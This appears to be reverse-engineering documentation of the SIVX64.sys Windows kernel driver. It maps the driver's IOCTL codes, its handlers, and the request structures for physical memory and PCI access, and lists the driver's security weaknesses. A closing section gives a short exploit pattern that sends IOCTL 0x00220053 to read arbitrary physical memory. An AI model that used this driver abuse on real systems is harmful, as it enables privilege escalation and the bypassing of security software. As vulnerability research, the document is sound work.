# SIVX64.sys IOCTL Protocol Documentation

## Driver Overview

| Property | Value |
|----------|-------|
| File | SIVX64.sys |
| Image Base | 0x10000 |
| Entry Point | 0x32CD4 (GS cookie stub -> real at 0x32008) |
| Functions | 213 |
| Device Type | FILE_DEVICE_UNKNOWN (0x22) |
| I/O Method | METHOD_NEITHER (Type3InputBuffer) |

## Sections

| Section | VA | Size | Purpose |
|---------|----|----- |---------|
| .text | 0x1000 | 0x3B91 | Helper functions |
| .rdata | 0x5000 | 0x9130 | Constants/strings |
| .data | 0xF000 | 0x15C | Global variables |
| .pdata | 0x10000 | 0x870 | Exception info |
| PAGE | 0x11000 | 0x208F3 | Main code (dispatch) |
| INIT | 0x32000 | 0x17B4 | DriverEntry |
| .rsrc | 0x34000 | 0x3F8 | Resources |
| .reloc | 0x35000 | 0xA84 | Relocations |

## DriverEntry Initialization Sequence

```
DriverEntry(PDRIVER_OBJECT DriverObject [rcx->r12], PUNICODE_STRING RegistryPath [rdx->rsi])

  0x32032: RtlInitUnicodeString()  // Init device name string
  0x3206A: IoCreateDevice()  // Create device, type=0x22, ext_size=large
  0x32153: KeQueryTimeIncrement()  // Get timer resolution
  0x32180: PsGetVersion()  // Get OS version
  0x32208: KeInitializeTimer()  // Init periodic timer at DevExt+0x80
  0x3221F: KeInitializeDpc()  // Init DPC at DevExt+0xC0
  0x324DD: IoCreateSymbolicLink()  // Create user-accessible symlink
  0x32B9D: IoCreateSynchronizationEvent()  // Sync event for serialization

  // MajorFunction table setup (at end of DriverEntry):
  DriverObject+0x68: DriverUnload -> handler at 0x11008
  DriverObject+0x70: IRP_MJ_CREATE -> handler at 0x111C8
  DriverObject+0x80: IRP_MJ_CLOSE -> handler at 0x11890
  DriverObject+0xE0: IRP_MJ_DEVICE_CONTROL -> handler at 0x11984
```

## IOCTL Dispatch Mechanism

The dispatch handler at RVA 0x11984 (30035 bytes) processes IOCTLs as follows:

1. Extracts DeviceExtension from `DeviceObject+0x40`
2. Gets CurrentStackLocation from `IRP+0xB8`
3. Reads IoControlCode from `StackLocation+0x18`
4. Extracts function number: `(IoControlCode >> 2) & 0xFFF`
5. Calls `SeSinglePrivilegeCheck` for privilege validation
6. Dispatches via cascading binary comparison:
   - cmp func_num, 0x100 -> branch high
   - cmp func_num, 0x74 -> branch mid-high
   - cmp func_num, 0x34 -> branch mid
   - cmp func_num, 0x18 -> branch low
   - sub-chain for exact match within each range

Default status: `STATUS_INVALID_DEVICE_REQUEST (0xC0000004)`

### IRP Field Mapping

| Field | Source | Register |
|-------|--------|----------|
| DeviceExtension | rcx+0x40 -> r12 | - |
| IRP | rdx -> r15 | - |
| CurrentStackLocation | [rdx+0xB8] | - |
| IoControlCode_raw | [StackLoc+0x18] | - |
| FunctionNumber | (IoControlCode >> 2) & 0xFFF -> r9d then edx | - |
| InputBufferLength | [StackLoc+0x10] -> ebx | - |
| OutputBufferLength | [StackLoc+0x08] -> r13d | - |
| Type3InputBuffer | [StackLoc+0x30] -> r9/r10 | - |
| SystemBuffer | [IRP+0x18] -> r14 | - |

## IOCTL Function Codes

All IOCTLs use `CTL_CODE(FILE_DEVICE_UNKNOWN, Function, Method, FILE_ANY_ACCESS)`

| Function | IOCTL (NEITHER) | Handler RVA | Description |
|----------|-----------------|-------------|-------------|
| 0x04 | 0x00220013 | 0x22753 | PCI config space read (byte) |
| 0x07 | 0x0022001F | 0x22723 | PCI config space read (word) |
| 0x08 | 0x00220023 | 0x225F2 | Physical memory read (byte) / Port I/O read |
| 0x0C | 0x00220033 | 0x224A8 | Physical memory read (word/dword) |
| 0x10 | 0x00220043 | 0x22164 | Physical memory read (dword/qword) via MmMapIoSpace |
| 0x100 | 0x00220400 | 0x256D1 | Large operation (possibly firmware/SMBIOS) |
| 0x13 | 0x0022004F | 0x21EC4 | Physical memory write (byte/word) |
| 0x14 | 0x00220053 | 0x11B91 | Physical memory write with mapped I/O table entries |
| 0x18 | 0x00220063 | 0x2280A | Extended I/O operation (bus data read/write) |
| 0x34 | 0x002200D0 | 0x22BFA | Device enumeration / WMI query |
| 0x74 | 0x002201D0 | 0x23AF6 | Extended device query |

## IOCTL Input/Output Structures

### Physical Memory Read (Function 0x14 / IOCTL 0x00220053)

This is the primary physical memory R/W IOCTL used for exploitation.

```c
// Input buffer (via Type3InputBuffer, METHOD_NEITHER)
// Minimum size: 0x48 bytes
typedef struct _SIV_MAPPED_IO_REQUEST {
    LARGE_INTEGER BasePhysAddr;     // +0x00: Physical address to map
    ULONG         TotalSize;        // +0x08: Bytes to map (0x100..0x400000)
    ULONG         Reserved0C;       // +0x0C
    USHORT        Flags;            // +0x0E: Bit 15 = direction flag
    ULONG         Reserved10;       // +0x10
    USHORT        EntryCount;       // +0x14: Number of R/W entries
    BYTE          Padding[0x1A];    // +0x16..+0x2F
    // +0x30: Array of SIV_IO_ENTRY[EntryCount]
} SIV_MAPPED_IO_REQUEST;

typedef struct _SIV_IO_ENTRY {
    ULONG  Offset;                  // +0x00: Offset within mapped region
    ULONG  Data[5];                 // +0x04: Data payload (read into or write from)
} SIV_IO_ENTRY;  // 24 bytes each

// Validation: EntryCount * 24 + 6 <= InputBufferLength
// Validation: TotalSize >= 0x100 && TotalSize <= 0x400000
// Output: Data written back into input buffer entries (METHOD_NEITHER)
```

### Simple Physical Read (Functions 0x08, 0x0C, 0x10)

```c
// Simpler read operations for single values
typedef struct _SIV_PHYS_SIMPLE_READ {
    LARGE_INTEGER PhysAddr;          // +0x00: Target physical address
    ULONG         Size;              // +0x08: Access width
    ULONG         Flags;             // +0x0C: Operation flags
} SIV_PHYS_SIMPLE_READ;

// Output written back into buffer:
// Function 0x08: 1-byte read
// Function 0x0C: 2-byte read
// Function 0x10: 4/8-byte read via MmMapIoSpace
```

### Physical Write (Function 0x13)

```c
typedef struct _SIV_PHYS_WRITE {
    LARGE_INTEGER PhysAddr;          // +0x00: Target physical address
    ULONG         Size;              // +0x08: Access width
    ULONG64       Value;             // +0x0C or +0x10: Value to write
} SIV_PHYS_WRITE;
```

## Device Extension Structure

```c
// Total size: >= 0x2DF8 bytes
// Accessed via DeviceObject->DeviceExtension (DeviceObject+0x40)
typedef struct _SIV_DEVICE_EXTENSION {
    /* +0x000 */ State flags (bit-tested);
    /* +0x008 */ Capability flags (init=0x40, bit 0x16 tested);
    /* +0x010 */ Signature field (compared to 0x5F534750 = _SGP);
    /* +0x040 */ Computed capability mask;
    /* +0x04C */ Timer tick copy;
    /* +0x050 */ Timer tick copy;
    /* +0x06C */ Atomic ref counter (lock add);
    /* +0x070 */ PsGetVersion output struct;
    /* +0x080 */ KTIMER (KeInitializeTimer);
    /* +0x0C0 */ KDPC (KeInitializeDpc);
    /* +0x110 */ Performance counter function ptr;
    /* +0x11A8 */ Enabled flag (=1);
    /* +0x11AC */ Page size (=0x1000);
    /* +0x11B0 */ Timer increment (from KeQueryTimeIncrement, min 10000);
    /* +0x1C0 */ Config param 1 (=9);
    /* +0x1C4 */ Config param 2 (=10);
    /* +0x1D8 */ Bitmask (=0xFFFFFFFF);
    /* +0x2DE0 */ WMI state 1;
    /* +0x2DEC */ WMI max value (=0xFF);
    /* +0x2DF0 */ WMI data pointer;
} SIV_DEVICE_EXTENSION;
```

## Global Variables (.data section)

| Offset | RVA | Init Value | Refs | Likely Purpose |
|--------|-----|------------|------|----------------|
| +0x100 | 0xF100 | 0x00002B992DDFA232 | 12 | Global state |
| +0x108 | 0xF108 | 0xFFFFD466D2205DCD | 2 | Global state |
| +0x110 | 0xF110 | 0x00000000000152E8 | 2 | Global state |
| +0x118 | 0xF118 | 0x00000000000152D8 | 1 | Global state |
| +0x128 | 0xF128 | 0x0000002E00000001 | 2 | Global state |
| +0x140 | 0xF140 | 0x0000000000000000 | 1 | Global state |
| +0x148 | 0xF148 | 0x0000000000000000 | 2 | Global state |
| +0x150 | 0xF150 | 0x0000000000000000 | 1 | Global state |
| +0x158 | 0xF158 | 0x0000000000000000 | 1 | Global state |

## Security Analysis

### Vulnerabilities

1. **Arbitrary Physical Memory Read/Write**: Functions 0x08-0x14 provide
   unrestricted physical memory access via MmMapIoSpace
2. **METHOD_NEITHER**: Input buffers are raw user-mode pointers (Type3InputBuffer)
   - No kernel-mode copy/probe by I/O manager
   - Driver must manually validate (only basic size checks observed)
3. **Privilege Check Only**: SeSinglePrivilegeCheck is the only access control
   - No DACL on the device object
   - Any process with appropriate privilege can send IOCTLs
4. **Large Attack Surface**: 30KB dispatch function with 11+ IOCTL handlers

### Exploitation for Physical Memory Access

```c
// Minimal exploit pattern:
// 1. Open device handle
HANDLE hDev = CreateFile(L"\\\\.\\SIV", ...);

// 2. Build read request
SIV_MAPPED_IO_REQUEST req = {0};
req.BasePhysAddr.QuadPart = target_phys_addr;
req.TotalSize = 0x1000;  // Map one page
req.EntryCount = 1;
req.Entries[0].Offset = 0;  // Read from start of mapped region

// 3. Send IOCTL
// CTL_CODE(0x22, 0x14, 3, 0) = 0x00220053
DeviceIoControl(hDev, 0x00220053, &req, sizeof(req), &req, sizeof(req), ...);
// Result in req.Entries[0].Data
```

## Imports Used

### Physical Memory APIs
- `HalTranslateBusAddress` - Bus to physical address translation
- `HalGetBusDataByOffset` - PCI config space read
- `HalSetBusDataByOffset` - PCI config space write
- `MmMapIoSpace` (called internally) - Map physical to virtual
- `MmUnmapIoSpace` (imported) - Unmap physical memory

### Synchronization
- `KeInitializeMutex` / `KeReleaseMutex` - Serialization
- `IoCreateSynchronizationEvent` - Named event
- `KeWaitForSingleObject` - Wait for mutex/event

### WMI
- `IoWMIOpenBlock` / `IoWMIQueryAllData` - WMI data queries